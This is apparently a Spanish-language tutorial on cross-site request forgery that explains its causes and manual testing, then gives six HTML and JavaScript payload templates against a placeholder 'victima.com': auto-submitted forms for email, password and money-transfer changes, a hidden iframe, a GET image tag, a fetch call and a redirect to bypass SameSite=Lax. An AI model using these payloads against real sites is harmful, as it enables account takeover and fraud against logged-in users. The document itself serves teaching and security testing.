## ¿Qué es CSRF?

CSRF (Cross-Site Request Forgery) es una vulnerabilidad web que permite a un atacante ejecutar acciones no autorizadas en una aplicación web en la que el usuario está autenticado, engañándolo para que realice peticiones involuntarias.

## ¿Por qué ocurre?

- **Autenticación basada en cookies**: Los navegadores envían automáticamente las cookies asociadas a un dominio en cada petición.
- **Falta de validación de origen**: La aplicación no verifica que la petición provenga de un origen confiable.
- **Peticiones predecibles**: Las acciones críticas no requieren tokens únicos o cabeceras personalizadas.

## ¿Cuándo ocurre?

- El usuario está autenticado en la aplicación objetivo.
- La aplicación no implementa mecanismos de protección CSRF.
- El atacante logra que el usuario acceda a un sitio malicioso mientras mantiene la sesión activa.

## ¿Cómo encontrar vulnerabilidades CSRF?

### Análisis manual
1. Identificar endpoints que realicen cambios de estado (POST, PUT, DELETE).
2. Verificar si requieren tokens CSRF en el cuerpo o cabeceras.
3. Comprobar si las cookies tienen atributos `SameSite` adecuados.
4. Probar si la validación de `Origin`/`Referer` es inexistente o débil.

### Pruebas básicas
```html
<!-- Formulario de prueba CSRF -->
<form action="https://victima.com/cambiar-email" method="POST">
  <input type="hidden" name="email" value="atacante@malicioso.com"/>
  <input type="submit" value="Click"/>
</form>
```

## Tipos de explotación CSRF

### 1. CSRF clásico con formulario HTML

<form action="https://victima.com/transferir" method="POST">
  <input type="hidden" name="cuenta" value="atacante"/>
  <input type="hidden" name="cantidad" value="1000"/>
</form>
```htm
<script>document.forms[0].submit();</script>
```

### 2. CSRF con peticiones GET (si el endpoint acepta GET)

```html
<img src="https://victima.com/cambiar-email?email=atacante@mal.com" width="0" height="0">
```

### 3. CSRF con JSON (usando fetch o XMLHttpRequest)

```html
<script>
fetch('https://victima.com/api/update', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'atacante@mal.com'})
});
</script>
```
### 4. CSRF con redirecciones para evadir SameSite=Lax

```html
<script>
window.location = 'https://victima.com/transferir?cantidad=1000&cuenta=atacante';
</script>
```

### 5. CSRF con iframe (oculto)

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form target="csrf-frame" action="https://victima.com/cambiar-pass" method="POST">
  <input type="hidden" name="pass" value="nueva123"/>
</form>
<script>document.forms[0].submit();</script>
```

### 6. CSRF con carga de archivos (multipart/form-data)

```html
<form action="https://victima.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="archivo"/>
</form>
<script>
// Puede ser automatizado si se combina con otras vulnerabilidades
</script>
```